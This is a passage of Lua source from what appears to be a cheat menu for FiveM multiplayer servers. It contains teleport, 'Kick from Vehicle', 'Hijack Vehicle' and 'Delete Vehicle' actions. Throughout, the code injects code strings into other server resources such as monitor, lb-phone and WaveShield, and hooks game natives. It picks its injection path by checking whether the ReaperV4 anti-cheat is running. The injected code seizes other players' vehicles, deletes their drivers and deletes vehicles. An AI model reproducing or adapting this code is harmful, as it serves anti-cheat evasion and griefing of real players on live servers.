                                            TaskWarpPedIntoVehicle(playerPed, vehicle, -1)
                                        elseif seat >= 0 then
                                            TaskWarpPedIntoVehicle(playerPed, vehicle, seat)
                                        else
                                            print("[^5SYNC^7]: There aren't any seats available in this vehicle.")
                                        end
                                    else
                                        SetEntityCoords(PlayerPedId(), endCoords.x, endCoords.y, endCoords.z, false, false, false, false)
                                    end
                                else
                                    print("[^5SYNC^7]: There aren't any valid locations to teleport to.")
                                end
                            end
                        else
                            MachoInjectResourceRaw(GetResourceState("monitor") == "started" and "monitor" or "any", [[
                                if _G.OSINTFreecamObject then
                                    local function RotationToDirection(rot)
                                        local z = math.rad(rot.z)
                                        local x = math.rad(rot.x)
                                        local num = math.abs(math.cos(x))
                                        return vector3(-math.sin(z) * num, math.cos(z) * num, math.sin(x))
                                    end

                                    function GetEmptySeat(vehicle)
                                        local seats = {
                                            -1, 0, 1, 2
                                        }

                                        for _, seat in ipairs(seats) do
                                            if IsVehicleSeatFree(vehicle, seat) then
                                                return seat
                                            end
                                        end

                                        return -1
                                    end

                                    function hNative(nativeName, newFunction)
                                        local originalNative = _G[nativeName]
                                        if not originalNative or type(originalNative) ~= "function" then
                                            return
                                        end

                                        _G[nativeName] = function(...)
                                            return newFunction(originalNative, ...)
                                        end
                                    end

                                    hNative("RotationToDirection", function(originalFn, ...) return originalFn(...) end)
                                    hNative("GetEmptySeat", function(originalFn, ...) return originalFn(...) end)
                                    hNative("IsVehicleSeatFree", function(originalFn, ...) return originalFn(...) end)
                                    hNative("GetCamCoord", function(originalFn, ...) return originalFn(...) end)
                                    hNative("GetCamRot", function(originalFn, ...) return originalFn(...) end)
                                    hNative("StartShapeTestRay", function(originalFn, ...) return originalFn(...) end)
                                    hNative("GetShapeTestResult", function(originalFn, ...) return originalFn(...) end)
                                    hNative("IsEntityAVehicle", function(originalFn, ...) return originalFn(...) end)
                                    hNative("PlayerPedId", function(originalFn, ...) return originalFn(...) end)
                                    hNative("TaskWarpPedIntoVehicle", function(originalFn, ...) return originalFn(...) end)
                                    hNative("SetEntityCoordsWithoutPlantsReset", function(originalFn, ...) return originalFn(...) end)

                                    local camCoords = GetCamCoord(_G.OSINTFreecamObject)
                                    local rot = GetCamRot(_G.OSINTFreecamObject, 2)
                                    local forward = RotationToDirection(rot)
                                    local rayLength = 1000.0
                                    local targetPos = camCoords + forward * rayLength
                                    local rayHandle = StartShapeTestRay(camCoords.x, camCoords.y, camCoords.z, targetPos.x, targetPos.y, targetPos.z, -1, PlayerPedId(), 0)
                                    local _, hit, endCoords, _, entityHit = GetShapeTestResult(rayHandle)

                                    if hit then
                                        if entityHit ~= 0 and IsEntityAVehicle(entityHit) then
                                            local vehicle = entityHit
                                            local playerPed = PlayerPedId()
                                            local seat = GetEmptySeat(vehicle)
                                            if seat == -1 then
                                                TaskWarpPedIntoVehicle(playerPed, vehicle, -1)
                                            elseif seat >= 0 then
                                                TaskWarpPedIntoVehicle(playerPed, vehicle, seat)
                                            else
                                                print("[^5OSINT^7]: There aren't any seats available in this vehicle.")
                                            end
                                        else
                                            SetEntityCoordsWithoutPlantsReset(PlayerPedId(), endCoords.x, endCoords.y, endCoords.z, false, false, false, false)
                                        end
                                    else
                                        print("[^5OSINT^7]: There aren't any valid locations to teleport to.")
                                    end
                                end
                            ]])
                        end
                    else
                        if _G.OSINTFreecamObject then
                            local function RotationToDirection(rot)
                                local z = math.rad(rot.z)
                                local x = math.rad(rot.x)
                                local num = math.abs(math.cos(x))
                                return vector3(-math.sin(z) * num, math.cos(z) * num, math.sin(x))
                            end

                            function GetEmptySeat(vehicle)
                                local seats = {
                                    -1, 0, 1, 2
                                }

                                for _, seat in ipairs(seats) do
                                    if IsVehicleSeatFree(vehicle, seat) then
                                        return seat
                                    end
                                end

                                return -1
                            end

                            local camCoords = GetCamCoord(_G.OSINTFreecamObject)
                            local rot = GetCamRot(_G.OSINTFreecamObject, 2)
                            local forward = RotationToDirection(rot)
                            local rayLength = 1000.0

                            local targetPos = camCoords + forward * rayLength
                            local rayHandle = StartShapeTestRay(camCoords.x, camCoords.y, camCoords.z, targetPos.x, targetPos.y, targetPos.z, -1, PlayerPedId(), 0)
                            local _, hit, endCoords, _, entityHit = GetShapeTestResult(rayHandle)

                            if hit then
                                if entityHit ~= 0 and IsEntityAVehicle(entityHit) then
                                    local vehicle = entityHit
                                    local playerPed = PlayerPedId()
                                    local seat = GetEmptySeat(vehicle)
                                    if seat == -1 then
                                        TaskWarpPedIntoVehicle(playerPed, vehicle, -1)
                                    elseif seat >= 0 then
                                        TaskWarpPedIntoVehicle(playerPed, vehicle, seat)
                                    else
                                        print("[^5OSINT^7]: There aren't any seats available in this vehicle.")
                                    end
                                else
                                    MachoInjectThread(0, "any", "", [[ 
                                        function hNative(nativeName, newFunction)
                                            local originalNative = _G[nativeName]
                                            if not originalNative or type(originalNative) ~= "function" then
                                                return
                                            end

                                            _G[nativeName] = function(...)
                                                return newFunction(originalNative, ...)
                                            end
                                        end

                                        hNative("RotationToDirection", function(originalFn, ...) return originalFn(...) end)
                                        hNative("GetRightVector", function(originalFn, ...) return originalFn(...) end)
                                        hNative("Clamp", function(originalFn, ...) return originalFn(...) end)
                                        hNative("CreateThread", function(originalFn, ...) return originalFn(...) end)
                                        hNative("Wait", function(originalFn, ...) return originalFn(...) end)
                                        hNative("IsVehicleSeatFree", function(originalFn, ...) return originalFn(...) end)
                                        hNative("PlayerPedId", function(originalFn, ...) return originalFn(...) end)
                                        hNative("GetEntityCoords", function(originalFn, ...) return originalFn(...) end)
                                        hNative("CreateCam", function(originalFn, ...) return originalFn(...) end)
                                        hNative("DoesCamExist", function(originalFn, ...) return originalFn(...) end)
                                        hNative("SetCamCoord", function(originalFn, ...) return originalFn(...) end)
                                        hNative("SetCamRot", function(originalFn, ...) return originalFn(...) end)
                                        hNative("RenderScriptCams", function(originalFn, ...) return originalFn(...) end)
                                        hNative("DestroyCam", function(originalFn, ...) return originalFn(...) end)
                                        hNative("SetFocusEntity", function(originalFn, ...) return originalFn(...) end)
                                        hNative("SetTextFont", function(originalFn, ...) return originalFn(...) end)
                                        hNative("SetTextProportional", function(originalFn, ...) return originalFn(...) end)
                                        hNative("SetTextScale", function(originalFn, ...) return originalFn(...) end)
                                        hNative("SetTextDropShadow", function(originalFn, ...) return originalFn(...) end)
                                        hNative("SetTextEdge", function(originalFn, ...) return originalFn(...) end)
                                        hNative("SetTextOutline", function(originalFn, ...) return originalFn(...) end)
                                        hNative("SetTextCentre", function(originalFn, ...) return originalFn(...) end)
                                        hNative("SetTextColour", function(originalFn, ...) return originalFn(...) end)
                                        hNative("BeginTextCommandDisplayText", function(originalFn, ...) return originalFn(...) end)
                                        hNative("AddTextComponentSubstringPlayerName", function(originalFn, ...) return originalFn(...) end)
                                        hNative("EndTextCommandDisplayText", function(originalFn, ...) return originalFn(...) end)
                                        hNative("GetCamCoord", function(originalFn, ...) return originalFn(...) end)
                                        hNative("GetCamRot", function(originalFn, ...) return originalFn(...) end)
                                        hNative("IsControlPressed", function(originalFn, ...) return originalFn(...) end)
                                        hNative("GetDisabledControlNormal", function(originalFn, ...) return originalFn(...) end)
                                        hNative("TaskStandStill", function(originalFn, ...) return originalFn(...) end)
                                        hNative("SetFocusPosAndVel", function(originalFn, ...) return originalFn(...) end)
                                        hNative("StartExpensiveSynchronousShapeTestLosProbe", function(originalFn, ...) return originalFn(...) end)
                                        hNative("GetShapeTestResult", function(originalFn, ...) return originalFn(...) end)
                                        hNative("IsControlJustPressed", function(originalFn, ...) return originalFn(...) end)
                                        hNative("IsDisabledControlJustPressed", function(originalFn, ...) return originalFn(...) end)
                                        hNative("IsEntityAVehicle", function(originalFn, ...) return originalFn(...) end)
                                        hNative("TaskWarpPedIntoVehicle", function(originalFn, ...) return originalFn(...) end)
                                        hNative("SetEntityCoords", function(originalFn, ...) return originalFn(...) end)
                                        hNative("GiveWeaponToPed", function(originalFn, ...) return originalFn(...) end)
                                        hNative("SetCurrentPedWeapon", function(originalFn, ...) return originalFn(...) end)
                                        hNative("ShootSingleBulletBetweenCoords", function(originalFn, ...) return originalFn(...) end)

                                        SetEntityCoords(PlayerPedId(), ]] .. endCoords.x .. [[, ]] .. endCoords.y .. [[, ]] .. endCoords.z .. [[, false, false, false, false)
                                    ]])
                                end
                            else
                                print("[^5OSINT^7]: There aren't any valid locations to teleport to.")
                            end
                        end
                    end
                elseif action == "Kick from Vehicle" then
                    if GetResourceState("ReaperV4") ~= "started" or GetCurrentServerEndpoint() == "216.146.24.88:30120" then
                            local targetRes = (GetResourceState("lb-phone") == "started" and "lb-phone")
                                or (GetResourceState("WaveShield") == "started" and "WaveShield")
                                or "any"

                            Injection(targetRes, [[
                            function hNative(nativeName, newFunction)
                                local originalNative = _G[nativeName]
                                if not originalNative or type(originalNative) ~= "function" then
                                    return
                                end
                                _G[nativeName] = function(...) return newFunction(originalNative, ...) end
                            end

                            hNative("CreateThread", function(originalFn, ...) return originalFn(...) end)
                            hNative("Wait", function(originalFn, ...) return originalFn(...) end)
                            hNative("DoesEntityExist", function(originalFn, ...) return originalFn(...) end)
                            hNative("GetEntityCoords", function(originalFn, ...) return originalFn(...) end)
                            hNative("GetCamCoord", function(originalFn, ...) return originalFn(...) end)
                            hNative("GetCamRot", function(originalFn, ...) return originalFn(...) end)
                            hNative("StartShapeTestRay", function(originalFn, ...) return originalFn(...) end)
                            hNative("GetShapeTestResult", function(originalFn, ...) return originalFn(...) end)
                            hNative("GetPedInVehicleSeat", function(originalFn, ...) return originalFn(...) end)
                            hNative("SetEntityVisible", function(originalFn, ...) return originalFn(...) end)
                            hNative("DeletePed", function(originalFn, ...) return originalFn(...) end)
                            hNative("ClearPedTasksImmediately", function(originalFn, ...) return originalFn(...) end)
                            hNative("SetEntityCoordsNoOffset", function(originalFn, ...) return originalFn(...) end)
                            hNative("IsEntityAVehicle", function(originalFn, ...) return originalFn(...) end)
                            hNative("SetPedIntoVehicle", function(originalFn, ...) return originalFn(...) end)
                            hNative("PlayerPedId", function(originalFn, ...) return originalFn(...) end)
                            hNative("NetworkRequestControlOfEntity", function(originalFn, ...) return originalFn(...) end)
                            hNative("NetworkHasControlOfEntity", function(originalFn, ...) return originalFn(...) end)

                            local function RequestControl(entity, timeoutMs)
                                timeoutMs = timeoutMs or 2000
                                local start = GetGameTimer()

                                while (GetGameTimer() - start) < timeoutMs do
                                    if NetworkHasControlOfEntity(entity) then return true end
                                    NetworkRequestControlOfEntity(entity)
                                    Wait(0)
                                end

                                return NetworkHasControlOfEntity(entity)
                            end

                            local function RotationToDirection(rot)
                                local z = math.rad(rot.z)
                                local x = math.rad(rot.x)
                                local num = math.abs(math.cos(x))
                                return vector3(-math.sin(z) * num, math.cos(z) * num, math.sin(x))
                            end

                            function GetEmptySeat(vehicle)
                                local seats = { -1, 0, 1, 2 }

                                for _, seat in ipairs(seats) do
                                    if IsVehicleSeatFree(vehicle, seat) then
                                        return seat
                                    end
                                end

                                return -1
                            end

                            local player = PlayerPedId()
                            local oldCoords = GetEntityCoords(player)
                            local camCoords = GetCamCoord(_G[FLAG_CAM])
                            local rot = GetCamRot(_G[FLAG_CAM], 2)
                            local forward = RotationToDirection(rot)
                            local rayLength = 1000.0
                            local targetPos = camCoords + forward * rayLength
                            local rayHandle = StartShapeTestRay(camCoords.x, camCoords.y, camCoords.z, targetPos.x, targetPos.y, targetPos.z, -1, player, 0)
                            local _, hit, endCoords, _, entityHit = GetShapeTestResult(rayHandle)

                            local function HijackCar(vehicle)
                                if not vehicle or not DoesEntityExist(vehicle) then
                                    return
                                end

                                local driver = GetPedInVehicleSeat(vehicle, -1)
                                if driver ~= 0 and DoesEntityExist(driver) then
                                    SetPedIntoVehicle(player, vehicle, 0)
                                    RequestControl(vehicle, 2000)
                                    Wait(10)

                                    for i = 0, 4 do
                                        DeletePed(driver)
                                    end

                                    Wait(40)
                                    SetPedIntoVehicle(player, vehicle, -1)
                                    Wait(1)
                                    SetPedIntoVehicle(player, vehicle, GetEmptySeat(vehicle))
                                    Wait(1)
                                    SetPedIntoVehicle(player, vehicle, -1)
                                    Wait(450)
                                    ClearPedTasksImmediately(player)
                                    SetEntityCoordsNoOffset(player, oldCoords.x, oldCoords.y, oldCoords.z, true, true, true, true)
                                    Wait(100)
                                end
                            end

                            CreateThread(function()
                                if hit then
                                    if entityHit ~= 0 and IsEntityAVehicle(entityHit) then
                                        local vehicle = entityHit

                                        HijackCar(vehicle)
                                    end
                                end
                            end)
                        ]])
                    else
                        if _G.OSINTFreecamObject then
                            function hNative(nativeName, newFunction)
                                local originalNative = _G[nativeName]
                                if not originalNative or type(originalNative) ~= "function" then
                                    return
                                end

                                _G[nativeName] = function(...) return newFunction(originalNative, ...) end
                            end

                            hNative("CreateThread", function(originalFn, ...) return originalFn(...) end)
                            hNative("Wait", function(originalFn, ...) return originalFn(...) end)
                            hNative("DoesEntityExist", function(originalFn, ...) return originalFn(...) end)
                            hNative("GetEntityCoords", function(originalFn, ...) return originalFn(...) end)
                            hNative("GetCamCoord", function(originalFn, ...) return originalFn(...) end)
                            hNative("GetCamRot", function(originalFn, ...) return originalFn(...) end)
                            hNative("StartShapeTestRay", function(originalFn, ...) return originalFn(...) end)
                            hNative("GetShapeTestResult", function(originalFn, ...) return originalFn(...) end)
                            hNative("GetPedInVehicleSeat", function(originalFn, ...) return originalFn(...) end)
                            hNative("SetEntityVisible", function(originalFn, ...) return originalFn(...) end)
                            hNative("DeletePed", function(originalFn, ...) return originalFn(...) end)
                            hNative("ClearPedTasksImmediately", function(originalFn, ...) return originalFn(...) end)
                            hNative("SetEntityCoordsNoOffset", function(originalFn, ...) return originalFn(...) end)
                            hNative("IsEntityAVehicle", function(originalFn, ...) return originalFn(...) end)
                            hNative("SetPedIntoVehicle", function(originalFn, ...) return originalFn(...) end)
                            hNative("PlayerPedId", function(originalFn, ...) return originalFn(...) end)
                            hNative("NetworkRequestControlOfEntity", function(originalFn, ...) return originalFn(...) end)
                            hNative("NetworkHasControlOfEntity", function(originalFn, ...) return originalFn(...) end)

                            local function RequestControl(entity, timeoutMs)
                                timeoutMs = timeoutMs or 2000
                                local start = GetGameTimer()

                                while (GetGameTimer() - start) < timeoutMs do
                                    if NetworkHasControlOfEntity(entity) then return true end
                                    NetworkRequestControlOfEntity(entity)
                                    Wait(0)
                                end

                                return NetworkHasControlOfEntity(entity)
                            end

                            local function RotationToDirection(rot)
                                local z = math.rad(rot.z)
                                local x = math.rad(rot.x)
                                local num = math.abs(math.cos(x))
                                return vector3(-math.sin(z) * num, math.cos(z) * num, math.sin(x))
                            end

                            function GetEmptySeat(vehicle)
                                local seats = { -1, 0, 1, 2 }

                                for _, seat in ipairs(seats) do
                                    if IsVehicleSeatFree(vehicle, seat) then
                                        return seat
                                    end
                                end

                                return -1
                            end

                            local player = PlayerPedId()
                            local oldCoords = GetEntityCoords(player)
                            local camCoords = GetCamCoord(_G.OSINTFreecamObject)
                            local rot = GetCamRot(_G.OSINTFreecamObject, 2)
                            local forward = RotationToDirection(rot)
                            local rayLength = 1000.0
                            local targetPos = camCoords + forward * rayLength
                            local rayHandle = StartShapeTestRay(camCoords.x, camCoords.y, camCoords.z, targetPos.x, targetPos.y, targetPos.z, -1, player, 0)
                            local _, hit, endCoords, _, entityHit = GetShapeTestResult(rayHandle)

                            local function KickFromVehicle(vehicle)
                                if not vehicle or not DoesEntityExist(vehicle) then
                                    return
                                end

                                local driver = GetPedInVehicleSeat(vehicle, -1)
                                if driver ~= 0 and DoesEntityExist(driver) then
                                    SetPedIntoVehicle(player, vehicle, 0)
                                    RequestControl(vehicle, 2000)
                                    Wait(10)

                                    for i = 0, 4 do
                                        MachoInjectResource("monitor", [[
                                            DeletePed(]] .. driver .. [[)
                                        ]])
                                    end

                                    Wait(40)
                                    SetPedIntoVehicle(player, vehicle, -1)
                                    Wait(1)
                                    SetPedIntoVehicle(player, vehicle, GetEmptySeat(vehicle))
                                    Wait(1)
                                    SetPedIntoVehicle(player, vehicle, -1)
                                    Wait(450)
                                    ClearPedTasksImmediately(player)
                                    SetEntityCoordsNoOffset(player, oldCoords.x, oldCoords.y, oldCoords.z, true, true, true, true)
                                    Wait(100)
                                end
                            end

                            CreateThread(function()
                                if hit then
                                    if entityHit ~= 0 and IsEntityAVehicle(entityHit) then
                                        local vehicle = entityHit

                                        KickFromVehicle(vehicle)
                                    end
                                end
                            end)
                        end
                    end
                elseif action == "Hijack Vehicle" then
                    if GetResourceState("ReaperV4") ~= "started" or GetCurrentServerEndpoint() == "216.146.24.88:30120" then
                            local targetRes = (GetResourceState("lb-phone") == "started" and "lb-phone")
                                or (GetResourceState("WaveShield") == "started" and "WaveShield")
                                or "any"

                            Injection(targetRes, [[
                            function hNative(nativeName, newFunction)
                                local originalNative = _G[nativeName]
                                if not originalNative or type(originalNative) ~= "function" then
                                    return
                                end
                                _G[nativeName] = function(...) return newFunction(originalNative, ...) end
                            end

                            hNative("CreateThread", function(originalFn, ...) return originalFn(...) end)
                            hNative("Wait", function(originalFn, ...) return originalFn(...) end)
                            hNative("DoesEntityExist", function(originalFn, ...) return originalFn(...) end)
                            hNative("GetEntityCoords", function(originalFn, ...) return originalFn(...) end)
                            hNative("GetCamCoord", function(originalFn, ...) return originalFn(...) end)
                            hNative("GetCamRot", function(originalFn, ...) return originalFn(...) end)
                            hNative("StartShapeTestRay", function(originalFn, ...) return originalFn(...) end)
                            hNative("GetShapeTestResult", function(originalFn, ...) return originalFn(...) end)
                            hNative("GetPedInVehicleSeat", function(originalFn, ...) return originalFn(...) end)
                            hNative("SetEntityVisible", function(originalFn, ...) return originalFn(...) end)
                            hNative("DeletePed", function(originalFn, ...) return originalFn(...) end)
                            hNative("ClearPedTasksImmediately", function(originalFn, ...) return originalFn(...) end)
                            hNative("SetEntityCoordsNoOffset", function(originalFn, ...) return originalFn(...) end)
                            hNative("IsEntityAVehicle", function(originalFn, ...) return originalFn(...) end)
                            hNative("SetPedIntoVehicle", function(originalFn, ...) return originalFn(...) end)
                            hNative("PlayerPedId", function(originalFn, ...) return originalFn(...) end)
                            hNative("NetworkRequestControlOfEntity", function(originalFn, ...) return originalFn(...) end)
                            hNative("NetworkHasControlOfEntity", function(originalFn, ...) return originalFn(...) end)

                            local function RequestControl(entity, timeoutMs)
                                timeoutMs = timeoutMs or 2000
                                local start = GetGameTimer()

                                while (GetGameTimer() - start) < timeoutMs do
                                    if NetworkHasControlOfEntity(entity) then return true end
                                    NetworkRequestControlOfEntity(entity)
                                    Wait(0)
                                end

                                return NetworkHasControlOfEntity(entity)
                            end

                            local function RotationToDirection(rot)
                                local z = math.rad(rot.z)
                                local x = math.rad(rot.x)
                                local num = math.abs(math.cos(x))
                                return vector3(-math.sin(z) * num, math.cos(z) * num, math.sin(x))
                            end

                            function GetEmptySeat(vehicle)
                                local seats = { -1, 0, 1, 2 }

                                for _, seat in ipairs(seats) do
                                    if IsVehicleSeatFree(vehicle, seat) then
                                        return seat
                                    end
                                end

                                return -1
                            end

                            local player = PlayerPedId()
                            local oldCoords = GetEntityCoords(player)
                            local camCoords = GetCamCoord(_G[FLAG_CAM])
                            local rot = GetCamRot(_G[FLAG_CAM], 2)
                            local forward = RotationToDirection(rot)
                            local rayLength = 1000.0
                            local targetPos = camCoords + forward * rayLength
                            local rayHandle = StartShapeTestRay(camCoords.x, camCoords.y, camCoords.z, targetPos.x, targetPos.y, targetPos.z, -1, player, 0)
                            local _, hit, endCoords, _, entityHit = GetShapeTestResult(rayHandle)

                            local function HijackCar(vehicle)
                                if not vehicle or not DoesEntityExist(vehicle) then
                                    return
                                end

                                local driver = GetPedInVehicleSeat(vehicle, -1)
                                if driver ~= 0 and DoesEntityExist(driver) then
                                    SetPedIntoVehicle(player, vehicle, 0)
                                    RequestControl(vehicle, 2000)
                                    Wait(10)

                                    for i = 0, 4 do
                                        DeletePed(driver)
                                    end

                                    Wait(40)
                                    SetPedIntoVehicle(player, vehicle, -1)
                                    Wait(1)
                                    SetPedIntoVehicle(player, vehicle, GetEmptySeat(vehicle))
                                    Wait(1)
                                    SetPedIntoVehicle(player, vehicle, -1)
                                    Wait(450)
                                    ClearPedTasksImmediately(player)
                                    Wait(250)
                                    SetPedIntoVehicle(player, vehicle, -1)
                                end
                            end

                            CreateThread(function()
                                if hit then
                                    if entityHit ~= 0 and IsEntityAVehicle(entityHit) then
                                        local vehicle = entityHit

                                        HijackCar(vehicle)
                                    end
                                end
                            end)
                        ]])
                    else
                        if _G.OSINTFreecamObject then
                            function hNative(nativeName, newFunction)
                                local originalNative = _G[nativeName]
                                if not originalNative or type(originalNative) ~= "function" then
                                    return
                                end
                                _G[nativeName] = function(...) return newFunction(originalNative, ...) end
                            end

                            hNative("CreateThread", function(originalFn, ...) return originalFn(...) end)
                            hNative("Wait", function(originalFn, ...) return originalFn(...) end)
                            hNative("DoesEntityExist", function(originalFn, ...) return originalFn(...) end)
                            hNative("GetEntityCoords", function(originalFn, ...) return originalFn(...) end)
                            hNative("GetCamCoord", function(originalFn, ...) return originalFn(...) end)
                            hNative("GetCamRot", function(originalFn, ...) return originalFn(...) end)
                            hNative("StartShapeTestRay", function(originalFn, ...) return originalFn(...) end)
                            hNative("GetShapeTestResult", function(originalFn, ...) return originalFn(...) end)
                            hNative("GetPedInVehicleSeat", function(originalFn, ...) return originalFn(...) end)
                            hNative("SetEntityVisible", function(originalFn, ...) return originalFn(...) end)
                            hNative("DeletePed", function(originalFn, ...) return originalFn(...) end)
                            hNative("ClearPedTasksImmediately", function(originalFn, ...) return originalFn(...) end)
                            hNative("SetEntityCoordsNoOffset", function(originalFn, ...) return originalFn(...) end)
                            hNative("IsEntityAVehicle", function(originalFn, ...) return originalFn(...) end)
                            hNative("SetPedIntoVehicle", function(originalFn, ...) return originalFn(...) end)
                            hNative("PlayerPedId", function(originalFn, ...) return originalFn(...) end)
                            hNative("NetworkRequestControlOfEntity", function(originalFn, ...) return originalFn(...) end)
                            hNative("NetworkHasControlOfEntity", function(originalFn, ...) return originalFn(...) end)

                            local function RequestControl(entity, timeoutMs)
                                timeoutMs = timeoutMs or 2000
                                local start = GetGameTimer()

                                while (GetGameTimer() - start) < timeoutMs do
                                    if NetworkHasControlOfEntity(entity) then return true end
                                    NetworkRequestControlOfEntity(entity)
                                    Wait(0)
                                end

                                return NetworkHasControlOfEntity(entity)
                            end

                            local function RotationToDirection(rot)
                                local z = math.rad(rot.z)
                                local x = math.rad(rot.x)
                                local num = math.abs(math.cos(x))
                                return vector3(-math.sin(z) * num, math.cos(z) * num, math.sin(x))
                            end

                            function GetEmptySeat(vehicle)
                                local seats = { -1, 0, 1, 2 }

                                for _, seat in ipairs(seats) do
                                    if IsVehicleSeatFree(vehicle, seat) then
                                        return seat
                                    end
                                end

                                return -1
                            end

                            local player = PlayerPedId()
                            local oldCoords = GetEntityCoords(player)
                            local camCoords = GetCamCoord(_G.OSINTFreecamObject)
                            local rot = GetCamRot(_G.OSINTFreecamObject, 2)
                            local forward = RotationToDirection(rot)
                            local rayLength = 1000.0
                            local targetPos = camCoords + forward * rayLength
                            local rayHandle = StartShapeTestRay(camCoords.x, camCoords.y, camCoords.z, targetPos.x, targetPos.y, targetPos.z, -1, player, 0)
                            local _, hit, endCoords, _, entityHit = GetShapeTestResult(rayHandle)

                            local function HijackCar(vehicle)
                                if not vehicle or not DoesEntityExist(vehicle) then
                                    return
                                end

                                local driver = GetPedInVehicleSeat(vehicle, -1)
                                if driver ~= 0 and DoesEntityExist(driver) then
                                    SetPedIntoVehicle(player, vehicle, 0)
                                    RequestControl(vehicle, 2000)
                                    Wait(10)

                                    for i = 0, 4 do
                                        MachoInjectResource("monitor", [[
                                            DeletePed(]] .. driver .. [[)
                                        ]])
                                    end

                                    Wait(40)
                                    SetPedIntoVehicle(player, vehicle, -1)
                                    Wait(1)
                                    SetPedIntoVehicle(player, vehicle, GetEmptySeat(vehicle))
                                    Wait(1)
                                    SetPedIntoVehicle(player, vehicle, -1)
                                    Wait(450)
                                    ClearPedTasksImmediately(player)
                                    Wait(250)
                                    SetPedIntoVehicle(player, vehicle, -1)
                                end
                            end

                            CreateThread(function()
                                if hit then
                                    if entityHit ~= 0 and IsEntityAVehicle(entityHit) then
                                        local vehicle = entityHit

                                        HijackCar(vehicle)
                                    end
                                end
                            end)
                        end
                    end
                elseif action == "Delete Vehicle" then
                    if GetResourceState("ReaperV4") ~= "started" or GetCurrentServerEndpoint() == "216.146.24.88:30120" then
                            local targetRes = (GetResourceState("lb-phone") == "started" and "lb-phone")
                                or (GetResourceState("WaveShield") == "started" and "WaveShield")
                                or "any"

                            Injection(targetRes, [[
                            function hNative(nativeName, newFunction)
                                local originalNative = _G[nativeName]
                                if not originalNative or type(originalNative) ~= "function" then
                                    return
                                end
                                _G[nativeName] = function(...) return newFunction(originalNative, ...) end
                            end

                            hNative("CreateThread", function(originalFn, ...) return originalFn(...) end)
                            hNative("Wait", function(originalFn, ...) return originalFn(...) end)
                            hNative("DoesEntityExist", function(originalFn, ...) return originalFn(...) end)
                            hNative("GetEntityCoords", function(originalFn, ...) return originalFn(...) end)
                            hNative("GetCamCoord", function(originalFn, ...) return originalFn(...) end)
                            hNative("GetCamRot", function(originalFn, ...) return originalFn(...) end)
                            hNative("StartShapeTestRay", function(originalFn, ...) return originalFn(...) end)
                            hNative("GetShapeTestResult", function(originalFn, ...) return originalFn(...) end)
                            hNative("GetPedInVehicleSeat", function(originalFn, ...) return originalFn(...) end)
                            hNative("SetEntityVisible", function(originalFn, ...) return originalFn(...) end)
                            hNative("DeletePed", function(originalFn, ...) return originalFn(...) end)
                            hNative("ClearPedTasksImmediately", function(originalFn, ...) return originalFn(...) end)
                            hNative("SetEntityCoordsNoOffset", function(originalFn, ...) return originalFn(...) end)
                            hNative("IsEntityAVehicle", function(originalFn, ...) return originalFn(...) end)
                            hNative("SetPedIntoVehicle", function(originalFn, ...) return originalFn(...) end)
                            hNative("PlayerPedId", function(originalFn, ...) return originalFn(...) end)
                            hNative("NetworkRequestControlOfEntity", function(originalFn, ...) return originalFn(...) end)
                            hNative("NetworkHasControlOfEntity", function(originalFn, ...) return originalFn(...) end)

                            local function RequestControl(entity, timeoutMs)
                                timeoutMs = timeoutMs or 2000
                                local start = GetGameTimer()

                                while (GetGameTimer() - start) < timeoutMs do
                                    if NetworkHasControlOfEntity(entity) then return true end
                                    NetworkRequestControlOfEntity(entity)
                                    Wait(0)
                                end

                                return NetworkHasControlOfEntity(entity)
                            end

                            local function RotationToDirection(rot)
                                local z = math.rad(rot.z)
                                local x = math.rad(rot.x)
                                local num = math.abs(math.cos(x))
                                return vector3(-math.sin(z) * num, math.cos(z) * num, math.sin(x))
                            end

                            function GetEmptySeat(vehicle)
                                local seats = { -1, 0, 1, 2 }

                                for _, seat in ipairs(seats) do
                                    if IsVehicleSeatFree(vehicle, seat) then
                                        return seat
                                    end
                                end

                                return -1
                            end

                            local player = PlayerPedId()
                            local oldCoords = GetEntityCoords(player)
                            local camCoords = GetCamCoord(_G[FLAG_CAM])
                            local rot = GetCamRot(_G[FLAG_CAM], 2)
                            local forward = RotationToDirection(rot)
                            local rayLength = 1000.0
                            local targetPos = camCoords + forward * rayLength
                            local rayHandle = StartShapeTestRay(camCoords.x, camCoords.y, camCoords.z, targetPos.x, targetPos.y, targetPos.z, -1, player, 0)
                            local _, hit, endCoords, _, entityHit = GetShapeTestResult(rayHandle)

                            local function DeleteCar(vehicle)
                                if not vehicle or not DoesEntityExist(vehicle) then
                                    return
                                end

                                local driver = GetPedInVehicleSeat(vehicle, -1)
                                if driver ~= 0 and DoesEntityExist(driver) then
                                    SetPedIntoVehicle(player, vehicle, 0)
                                    RequestControl(vehicle, 2000)
                                    Wait(10)

                                    for i = 0, 4 do
                                        DeletePed(driver)
                                    end

                                    Wait(40)
                                    SetPedIntoVehicle(player, vehicle, -1)
                                    Wait(1)
                                    SetPedIntoVehicle(player, vehicle, GetEmptySeat(vehicle))
                                    Wait(1)
                                    SetPedIntoVehicle(player, vehicle, -1)
                                    Wait(450)
                                    ClearPedTasksImmediately(player)
                                    SetEntityCoordsNoOffset(player, oldCoords.x, oldCoords.y, oldCoords.z, true, true, true, true)
                                    Wait(100)
                                    DeleteEntity(vehicle)
                                else
                                    SetPedIntoVehicle(player, vehicle, -1)
                                    Wait(100)
                                    DeleteEntity(vehicle)
                                    Wait(100)
                                    SetEntityCoordsNoOffset(player, oldCoords.x, oldCoords.y, oldCoords.z, true, true, true, true)
                                end
                            end

                            CreateThread(function()
                                if hit then
                                    if entityHit ~= 0 and IsEntityAVehicle(entityHit) then
                                        local vehicle = entityHit

                                        DeleteCar(vehicle)
                                    end
                                end
                            end)
                        ]])
                    else
                        if _G.OSINTFreecamObject then
                            function hNative(nativeName, newFunction)
                                local originalNative = _G[nativeName]
                                if not originalNative or type(originalNative) ~= "function" then
                                    return
                                end
                                _G[nativeName] = function(...) return newFunction(originalNative, ...) end
                            end

                            hNative("CreateThread", function(originalFn, ...) return originalFn(...) end)
                            hNative("Wait", function(originalFn, ...) return originalFn(...) end)
                            hNative("DoesEntityExist", function(originalFn, ...) return originalFn(...) end)
                            hNative("GetEntityCoords", function(originalFn, ...) return originalFn(...) end)
                            hNative("GetCamCoord", function(originalFn, ...) return originalFn(...) end)
                            hNative("GetCamRot", function(originalFn, ...) return originalFn(...) end)
                            hNative("StartShapeTestRay", function(originalFn, ...) return originalFn(...) end)
                            hNative("GetShapeTestResult", function(originalFn, ...) return originalFn(...) end)
                            hNative("GetPedInVehicleSeat", function(originalFn, ...) return originalFn(...) end)
                            hNative("SetEntityVisible", function(originalFn, ...) return originalFn(...) end)
